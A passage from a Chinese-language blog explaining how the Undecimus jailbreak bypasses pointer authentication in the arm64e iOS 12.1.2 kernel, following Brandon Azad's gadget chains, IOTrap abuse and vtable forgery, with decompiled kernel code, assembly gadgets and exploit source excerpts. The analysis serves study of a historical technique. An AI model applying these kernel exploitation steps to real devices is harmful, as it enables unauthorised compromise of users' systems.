<p>有趣的事情来了，如果我们把一个常规的地址交给 PAC 验签 (<code>AUT*</code>)，那么它会给指针的 extension bits 插入一个 error code 使其异常。此后如果再将这个值进行签名 (<code>PAC*</code>)，由于 error code 的存在会签名失败，但是正确的 PAC 依然会被计算并插入，只是指针的第 62 位被翻转了。因此我们只要找到一个先对指针的值进行 <code>AUT*</code>，随后再进行 <code>PAC*</code> 最后将值写入固定内存的代码片段即可作为 Signing Gadget。</p>
<h2 id="PACIZA-Signing-Gadget"><a href="#PACIZA-Signing-Gadget" class="headerlink" title="PACIZA Signing Gadget"></a>PACIZA Signing Gadget</h2><p>基于上面的理论，Brandon Azad 在 arm64e 的 kernelcache 中发现了一个满足上述有利条件的代码片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sysctl_unregister_oid</span><span class="params">(sysctl_oid *oidp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   sysctl_oid *removed_oidp = <span class="literal">NULL</span>;</span><br><span class="line">   sysctl_oid *old_oidp = <span class="literal">NULL</span>;</span><br><span class="line">   BOOL have_old_oidp;</span><br><span class="line">   <span class="keyword">void</span> **handler_field;</span><br><span class="line">   <span class="keyword">void</span> *handler;</span><br><span class="line">   <span class="keyword">uint64_t</span> context;</span><br><span class="line">   ...</span><br><span class="line">   <span class="keyword">if</span> ( !(oidp-&gt;oid_kind &amp; <span class="number">0x400000</span>) )         <span class="comment">// Don't enter this if</span></span><br><span class="line">   &#123;</span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ( oidp-&gt;oid_version != <span class="number">1</span> )               <span class="comment">// Don't enter this if</span></span><br><span class="line">   &#123;</span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br><span class="line">   sysctl_oid *first_sibling = oidp-&gt;oid_parent-&gt;first;</span><br><span class="line">   <span class="keyword">if</span> ( first_sibling == oidp )                <span class="comment">// Enter this if</span></span><br><span class="line">   &#123;</span><br><span class="line">       removed_oidp = <span class="literal">NULL</span>;</span><br><span class="line">       old_oidp = oidp;</span><br><span class="line">       oidp-&gt;oid_parent-&gt;first = old_oidp-&gt;oid_link;</span><br><span class="line">       have_old_oidp = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br><span class="line">   handler_field = &amp;old_oidp-&gt;oid_handler;</span><br><span class="line">   handler = old_oidp-&gt;oid_handler;</span><br><span class="line">   <span class="keyword">if</span> ( removed_oidp || !handler )             <span class="comment">// Take the else</span></span><br><span class="line">   &#123;</span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       removed_oidp = <span class="literal">NULL</span>;</span><br><span class="line">       context = (<span class="number">0x14EF</span> &lt;&lt; <span class="number">48</span>) | ((<span class="keyword">uint64_t</span>)handler_field &amp; <span class="number">0xFFFFFFFFFFFF</span>);</span><br><span class="line">       *handler_field = ptrauth_sign_unauthenticated(</span><br><span class="line">               ptrauth_auth_function(handler, ptrauth_key_asia, &amp;context),</span><br><span class="line">               ptrauth_key_asia,</span><br><span class="line">               <span class="number">0</span>);</span><br><span class="line">       ...</span><br><span class="line">   &#125;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到在代码的最底部有一个 unauth 与 auth 的嵌套调用，先对 handler 执行 auth 即 <code>AUT*</code>，随后立即执行 unauth，即 <code>PAC*</code>，正好满足了 Signing Gadget 条件。另外一个重要条件是签名结果必须写入稳定的内存，使得我们能够轻易、稳定地读取到。这里写入的 <code>handler_field</code> 指向 <code>old_oidp-&gt;oid_handler</code>，继续分析可知它来自于函数入参的 <code>oidp</code>。</p>
<h3 id="寻找-Gadget"><a href="#寻找-Gadget" class="headerlink" title="寻找 Gadget"></a>寻找 Gadget</h3><p>下一步的关键就是如何触发 <code>sysctl_unregister_oid</code> 并控制 <code>oidp</code> 的值。幸运的是 <code>sysctl_oid</code> 是被 <code>global sysctl tree</code> 所持有的，用于向内核中注册参数。虽然没有任何直接指向 <code>sysctl_unregister_oid</code> 的指针，但许多 kext 在启动时会通过 sysctl 注册参数，在结束时会通过 <code>sysctl_unregister_oid</code> 实现反注册，这是一个重要的线索。</p>
<p>最终 Brandon Azad 在 <code>com.apple.nke.lttp</code> 这一 kext 中找到了一对函数 <code>l2tp_domain_module_stop</code> 和 <code>l2tp_domain_module_start</code>，调用前者时会传递一个全局变量 <code>sysctl__net_ppp_l2tp</code> 来实现反注册，调用后者可以重新启动模块，并且这对函数包含可被定位的引用，该引用是通过 Instruction Key A 无 Context 签名的。</p>
<p>还记得文章开头提到的非虚函数地址在进行 <code>IOTrap-&gt;func</code> 调用时也是通过 Instruction Key A 和无 Context 进行验签的。因此我们只需要通过 XREF 技术定位到函数地址和全局变量地址，即可通过修改 <code>sysctl__net_ppp_l2tp</code> 来篡改 <code>old_oidp-&gt;oid_handler</code>，接下来只要找到调用 <code>l2tp_domain_module_stop</code> 的方法就可以实现对任意地址的 PACIZA 签名了。</p>
<h3 id="触发-Gadget"><a href="#触发-Gadget" class="headerlink" title="触发 Gadget"></a>触发 Gadget</h3><p>似乎找到 <code>l2tp_domain_module_stop</code> 和找到一个 kexec 一样困难，但事实上它比一个完整的 kexec 简单的多，这是因为 <code>l2tp_domain_module_stop</code> 是无参的。我们依然可以尝试利用 IOTrap，但这一次我们无法劫持虚函数，因此需要找到一个已存在的包含 IOTrap 调用的对象。</p>
<p>所幸 Brandon Azad 在 kernelcache 中找到了一个 IOAudio2DeviceUserClient 类，它默认实现了 getTargetAndTrapForIndex 并提供了一个 IOTrap：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">IOExternalTrap *<span class="title">IOAudio2DeviceUserClient::getTargetAndTrapForIndex</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">       IOAudio2DeviceUserClient *<span class="keyword">this</span>, IOService **target, <span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">   *target = (IOService *)<span class="keyword">this</span>;</span><br><span class="line">   <span class="keyword">return</span> &amp;<span class="keyword">this</span>-&gt;IOAudio2DeviceUserClient.traps[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IOAudio2DeviceUserClient::initializeExternalTrapTable() &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;IOAudio2DeviceUserClient.trap_count = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">this</span>-&gt;IOAudio2DeviceUserClient.traps = IOMalloc(<span class="keyword">sizeof</span>(IOExternalTrap));</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的 <code>getTargetAndTrapForIndex</code> 将 target 指定为自己，这使得 <code>trap-&gt;func</code> 调用的隐含参数无法修改，即通过这种方式无法传递 arg0，也就只能通过篡改 <code>trap-&gt;func</code> 实现无参函数或是代码块的调用。</p>
<p>基于上述讨论，整个 PACIZA Signing Gadget 的构造和调用过程如下：</p>
<ol>
<li>通过 IOKit 的 userland 接口启动一个 IOAudio2DeviceService，获取到 IOAudio2DeviceUserClient 的 <code>mach_port</code> 句柄；</li>
<li>通过句柄找到其 <code>ipc_port</code>，其 <code>ip_kobject</code> 指针指向的是真正的 IOAudio2DeviceUserClient 对象。先记录下对象地址，随后在对象上找到 traps 地址，由于 IOAudio2DeviceUserClient 只声明了一个 trap，traps 的首地址即我们要修改的 IOTrap 的地址；</li>
<li>通过 String XREF 技术定位 <code>l2tp_domain_module_start</code>, <code>l2tp_domain_module_stop</code> 和 <code>sysctl__net_ppp_l2tp</code> 的地址，先缓存原始的 <code>sysctl_oid</code>，随后构造 <code>sysctl_oid</code> 满足 <code>sysctl_unregister_oid</code> 特定的执行路径，最后将 <code>sysctl_oid-&gt;oid_handler</code> 赋值为需要签名的地址；</li>
<li>修改第 2 步找到的 trap，将其 func 指向 <code>l2tp_domain_module_stop</code>，并通过 IOConnectTrap6 触发 IOAudio2DeviceUserClient 对象的 <code>IOTrap-&gt;func</code> 调用，这里便实现了对 <code>l2tp_domain_module_stop</code> 的调用，随后会执行到 <code>sysctl_unregister_oid</code>，并将签名失败的结果写入 <code>sysctl__net_ppp_l2tp-&gt;oid_handler</code>，此时我们可以读取结果，并翻转第 62 位得到正确的签名；</li>
<li>最后一步是通过 <code>l2tp_domain_module_start</code> 重启服务，但这里需要传递新的 <code>sysctl_oid</code> 作为入参，通过上面的 Primitives 是无法完成的。</li>
</ol>
<h2 id="清理环境"><a href="#清理环境" class="headerlink" title="清理环境"></a>清理环境</h2><p>由于 IOAudio2DeviceUserClient 的 IOTrap 调用仅能实现无参的 kexec，我们无法在完成 PACIZA 签名后重启 IOAudio2DeviceUserClient 服务，这会使得 Signing Gadget 失去幂等性，或是留下其他隐患，因此必须找到一个能有参调用 kexec 的办法来重启服务。</p>
<p>问题的关键是 <code>IOTrap-&gt;func</code> 调用时 arg0 指向了 this，因此单次调用时肯定无法修改 arg0 了，我们这里可以尝试多次跳转。所幸在 kernelcache 中有这样的一段代码：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV </span>        X0, X4</span><br><span class="line"><span class="keyword">BR </span>         X5</span><br></pre></td></tr></table></figure>
<p>由于我们通过 IOConnectTrap6 能控制 x1 ~ x6，所以通过 x4 既能间接控制 x0，x5 即是下一跳的地址，我们先让 <code>IOTrap-&gt;func</code> 指向这一片段的 PACIZA’d 地址，然后通过 x4 控制 arg0，x1 ~ x3 控制 arg1 ~ arg3，x5 控制 JOP 的目标地址，即可实现一个 4 个参数的 kexec。</p>
<p>因此我们只需要用上面的无参调用去签名一下上述代码块的地址，然后将其作为 <code>IOTrap-&gt;func</code> 的地址，再通过 IOConnectTrap6 的入参控制 x1 ~ x5 即可实现对 <code>l2tp_domain_module_start</code> 的带参调用，这里传递的是之前备份的 <code>sysctl_oid</code>，从而完美的恢复现场。</p>
<p>到这里，一个完美的 PACIZA Signing Gadget 就达成了，同时我们还得到了一个非常有用的代码片段的 PACIZA 签名：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV </span>        X0, X4</span><br><span class="line"><span class="keyword">BR </span>         X5</span><br></pre></td></tr></table></figure>
<p>我们将其称为 G1，也是这是后续工作的一个重要 Gadget。</p>
<h2 id="PACIA-amp-PACDA-Signing-Gadget"><a href="#PACIA-amp-PACDA-Signing-Gadget" class="headerlink" title="PACIA &amp; PACDA Signing Gadget"></a>PACIA &amp; PACDA Signing Gadget</h2><p>遗憾的是许多调用点（例如虚函数）都采用了带有 Context 的调用方式，例如上文中提到的片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">context = (<span class="number">0x14EF</span> &lt;&lt; <span class="number">48</span>) | ((<span class="keyword">uint64_t</span>)handler_field &amp; <span class="number">0xFFFFFFFFFFFF</span>);</span><br><span class="line">*handler_field = ptrauth_sign_unauthenticated(</span><br><span class="line">       ptrauth_auth_function(handler, ptrauth_key_asia, &amp;context),</span><br><span class="line">       ptrauth_key_asia,</span><br><span class="line">       <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这就要求我们找到包含 PACIA 和 PACDA 的代码块，且他们要将签名结果写入稳定的内存。所幸这样的 Gadget 也是存在的：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; sub_FFFFFFF007B66C48</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">PACIA</span>       X9, X10</span><br><span class="line"><span class="keyword">STR </span>        X9, [X2,<span class="number">#0x100</span>]</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">PACDA</span>       X9, X10</span><br><span class="line"><span class="keyword">STR </span>        X9, [X2,<span class="number">#0xF8</span>]</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">PACIBSP</span></span><br><span class="line"><span class="symbol">STP</span>         X20, X19, [<span class="built_in">SP</span>,<span class="symbol">#var_20</span>]!</span><br><span class="line"><span class="symbol">...</span>         <span class="comment">;; Function body (mostly harmless)</span></span><br><span class="line"><span class="symbol">LDP</span>         X20, X19, [<span class="built_in">SP</span>+<span class="number">0x20</span>+var_20],<span class="number">#0x20</span></span><br><span class="line"><span class="symbol">AUTIBSP</span></span><br><span class="line"><span class="keyword">MOV </span>        W0, <span class="number">#0</span></span><br><span class="line"><span class="symbol">RET</span></span><br></pre></td></tr></table></figure>

<p>这一段代码同时包含了 PACIA 和 PACDA，且后续都通过 STR 写入了内存。唯一不足的是在执行完语句后距离 RET 还有很远的距离，且当前入口点位于函数的中间位置。所幸函数真正的开场白位于这些指令之后：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">PACIBSP</span></span><br><span class="line"><span class="symbol">STP</span>         X20, X19, [<span class="built_in">SP</span>,<span class="symbol">#var_20</span>]!</span><br><span class="line"><span class="comment">; ...</span></span><br></pre></td></tr></table></figure>

<p>所以似乎我们从中部进入函数不会有太多的不良影响，在这里我们只需要控制 x9 作为指针，x10 作为 context，x2 控制写入的内存区域，即可实现一个 PACIA &amp; PACDA 的签名伪造。</p>
<p>但是基于 IOAudio2DeviceUserClient 的 IOConnectTrap6 我们只能控制 x1 ~ x6，无法直接控制 x9 和 x10，这里就需要我们寻找更多的 Gadget 来实现组合调用来控制 x9 和 x10。</p>
<p>随后 Brandon Azad 在 kernelcache 中又搜索到了几个可利用的 Gadget，截止到目前我们总共有 3 个可用的 Gadget：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; G1</span></span><br><span class="line"><span class="keyword">MOV </span>        X0, X4</span><br><span class="line"><span class="keyword">BR </span>         X5</span><br><span class="line"></span><br><span class="line"><span class="comment">; G2</span></span><br><span class="line"><span class="keyword">MOV </span>        X9, X0</span><br><span class="line"><span class="keyword">BR </span>         X1</span><br><span class="line"></span><br><span class="line"><span class="comment">; G3</span></span><br><span class="line"><span class="keyword">MOV </span>        X10, X3</span><br><span class="line"><span class="keyword">BR </span>         X6</span><br></pre></td></tr></table></figure>

<p>G1 使我们能通过 x4 控制 x0，再通过 G2 可将 x0 写入 x9，最后通过 G3 将 x3 写入 x10，G1 -&gt; G2 通过 X5 指向 G2 实现，G2 - &gt; G3 通过 X1 指向 G3 实现，最后通过 x6 即可跳转到包含 PACIA &amp; PACDA 的 Gadget，此时 x2, x9, x10 均已间接填入合适的参数，因此可以完成一个 PACIA &amp; PACDA Forgery。</p>
<p>上述调用环环相扣，且不能有任何寄存器上的重叠，否则将无法有效地准备参数，我们难以想象找到这么一组 Gadget 耗费了多么大的精力，在这里向大佬致敬。基于上述讨论，我们以 G1 为 <code>IOTrap-&gt;func</code> 的入口点，如下准备 IOConnectTrap6 的参数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">trap-&gt;func = paciza(G1);</span><br><span class="line">arg1 = x1 = G3;</span><br><span class="line">arg2 = x2 = buffer_to_save_pacxad_pointer;</span><br><span class="line">arg3 = x3 = context;</span><br><span class="line">arg4 = x4 = pointer;</span><br><span class="line">arg5 = x5 = G2;</span><br><span class="line">arg6 = x6 = sub_FFFFFFF007B66C48_PACXA_ENTRY</span><br></pre></td></tr></table></figure>

<p>这会形成一个链式调用，控制流如下：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV </span>        X0, X4 </span><br><span class="line"><span class="keyword">BR </span>         X5  </span><br><span class="line"><span class="keyword">MOV </span>        X9, X0</span><br><span class="line"><span class="keyword">BR </span>         X1</span><br><span class="line"><span class="keyword">MOV </span>        X10, X3</span><br><span class="line"><span class="keyword">BR </span>         X6</span><br><span class="line"><span class="symbol">PACIA</span>       X9, X10</span><br><span class="line"><span class="keyword">STR </span>        X9, [X2,<span class="number">#0x100</span>]</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">PACDA</span>       X9, X10</span><br><span class="line"><span class="keyword">STR </span>        X9, [X2,<span class="number">#0xF8</span>]</span><br><span class="line"><span class="comment">; ...</span></span><br></pre></td></tr></table></figure>

<p>到这里我们就通过一系列的 Gadget 和 IOConnectTrap6 实现了 PACIA &amp; PACDA 的 Forgery。</p>
<h2 id="完美的-kexec"><a href="#完美的-kexec" class="headerlink" title="完美的 kexec"></a>完美的 kexec</h2><p>到这里我们已经可以伪造 Key A 的任意签名，但依然没有实现完美的 kexec，此时我们还只能实现 4 个参数的 kexec，其根本原因是我们依赖于 IOAudio2DeviceUserClient 对 getTargetAndTrapForIndex 的默认实现，遗憾的是这一实现中将 target 设置为了 this 从而导致我们无法直接控制 arg0，转向 Gadget 后则会遇到 4 个参数的限制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">IOExternalTrap *<span class="title">IOAudio2DeviceUserClient::getTargetAndTrapForIndex</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">       IOAudio2DeviceUserClient *<span class="keyword">this</span>, IOService **target, <span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">   *target = (IOService *)<span class="keyword">this</span>;</span><br><span class="line">   <span class="keyword">return</span> &amp;<span class="keyword">this</span>-&gt;IOAudio2DeviceUserClient.traps[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了能实现完美的 kexec，最好的办法依然是劫持虚函数，虽然 PAC 对虚函数表和虚函数指针做了签名，但它是通过 Key A 完成的，到这里我们已经能够伪造这些签名，从而再次实现虚函数的劫持。</p>
<h3 id="修改-getTargetAndTrapForIndex-为默认实现"><a href="#修改-getTargetAndTrapForIndex-为默认实现" class="headerlink" title="修改 getTargetAndTrapForIndex 为默认实现"></a>修改 getTargetAndTrapForIndex 为默认实现</h3><p>IOAudio2DeviceUserClient 覆盖实现的 getTargetAndTrapForIndex 给我们带来了麻烦，这里我们可以将其修改为父类的默认实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IOExternalTrap * IOUserClient::</span><br><span class="line">getTargetAndTrapForIndex(IOService ** targetP, UInt32 index)</span><br><span class="line">&#123;</span><br><span class="line">      IOExternalTrap *trap = getExternalTrapForIndex(index);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (trap) &#123;</span><br><span class="line">              *targetP = trap-&gt;object;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> trap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于 IOAudio2DeviceUserClient 的 traps 不是通过 getExternalTrapForIndex 取得的，这里我们还需要继续修改 getExternalTrapForIndex 方法，使其能够返回一个构造的 IOTrap，这里遇到的一个问题是父类默认实现为返回空值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IOExternalTrap * IOUserClient::</span><br><span class="line">getExternalTrapForIndex(UInt32 index)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就需要我们在 IOUserClient 上找到一个合适的函数和成员变量，使得该函数返回成员变量或成员变量的某个引用，这样我们就能间接地通过控制成员变量来返回特定的 IOTrap。幸运的是 IOUserClient 间接继承了超类 IORegistryEntry，它包含了一个 reserved 成员和一个返回该成员的成员函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IORegistryEntry</span> :</span> <span class="keyword">public</span> OSObject</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="comment">/*! @var reserved</span></span><br><span class="line"><span class="comment">    Reserved for future use.  (Internal use only)  */</span></span><br><span class="line">    ExpansionData * reserved;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">uint64_t</span> <span class="title">IORegistryEntry::getRegistryEntryID</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (reserved)</span><br><span class="line">    	<span class="keyword">return</span> (reserved-&gt;fRegistryEntryID);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">    	<span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可见我们只要将虚函数表中的 <code>getExternalTrapForIndex</code> 指向 <code>IORegistryEntry::getRegistryEntryID</code>，再修改 UserClient 实例的 reversed 使其 <code>reserved-&gt;fRegistryEntryID</code> 指向我们构造的 IOTrap 即可。</p>
<p>通过上述改造，我们再次获得了一个完美的支持 7 个入参的 kexec，<strong>理论分析起来容易，要实施这一过程是十分复杂的，因为每一个虚函数所使用的 sign context 是不同的，这就要求 dump 出所有的 sign context 再进行处理</strong>。</p>
<h1 id="绕过-PAC-的代码导读"><a href="#绕过-PAC-的代码导读" class="headerlink" title="绕过 PAC 的代码导读"></a>绕过 PAC 的代码导读</h1><p>经过理论分析相信读者已经对整个绕过的过程有了整体认识，由于整个过程太过复杂，单单进行理论分析难免会让人云里雾里，将上述理论分析结合阅读 Undecimus 中的代码可以很好的加深理解。</p>
<p>这部分代码位于上一篇文章提到的 <code>init_kexec</code> 和 <code>kexec</code> 两个函数中，针对 arm64e 架构采用了完全不同的手段。<strong>鉴于本文的理论分析部分已涉及到大量的代码，这里不再完整的进行分析，只说几个理论分析中未完全提及的内容</strong>。完整的代码请读者结合上述理论分析自行阅读，相信你会有很大的收获。</p>
<p>经过上面的分析相信读者能够轻易地理解 <code>kernel_call_init</code> 中的 <code>stage1_kernel_call_init</code> 和 <code>stage2_kernel_call_init</code>，这两个阶段主要是完成 UserClient 的启动和 G1 的签名工作，需要注意的是在 <code>stage2_kernel_call_init-&gt;stage1_init_kernel_pacxa_forging</code> 的结尾处创建了一个 buffer，用来存储新的虚函数表以及 PACIA &amp; PACDA 的签名结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stage1_init_kernel_pacxa_forging() &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    kernel_pacxa_buffer = stage1_get_kernel_buffer();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此外 A12 在 iOS 12.1.2 的 PAC 机制也允许在 userland 通过 XPAC 指令直接将一个加签的指针还原，这给我们拷贝虚函数表带来了极大的便利，这段代码位于 <code>stage3_kernel_call_init</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span></span><br><span class="line">kernel_xpacd(<span class="keyword">uint64_t</span> pointer) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __arm64e__</span></span><br><span class="line">	<span class="keyword">return</span> xpacd(pointer);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> pointer;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> *</span><br><span class="line">stage2_copyout_user_client_vtable() &#123;</span><br><span class="line">	<span class="comment">// Get the address of the vtable.</span></span><br><span class="line">	original_vtable = kernel_read64(user_client);</span><br><span class="line">	<span class="keyword">uint64_t</span> original_vtable_xpac = kernel_xpacd(original_vtable);</span><br><span class="line">	<span class="comment">// Read the contents of the vtable to local buffer.</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *vtable_contents = <span class="built_in">malloc</span>(max_vtable_size);</span><br><span class="line">	assert(vtable_contents != <span class="literal">NULL</span>);</span><br><span class="line">	kernel_read(original_vtable_xpac, vtable_contents, max_vtable_size);</span><br><span class="line">	<span class="keyword">return</span> vtable_contents;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 patch 虚函数表时，每个函数都有其特定的 context，因此这里使用了 dump 出来的对应于每个虚函数的 PAC Code，这段代码位于 <code>stage2_patch_user_client_vtable</code> 中：</p>
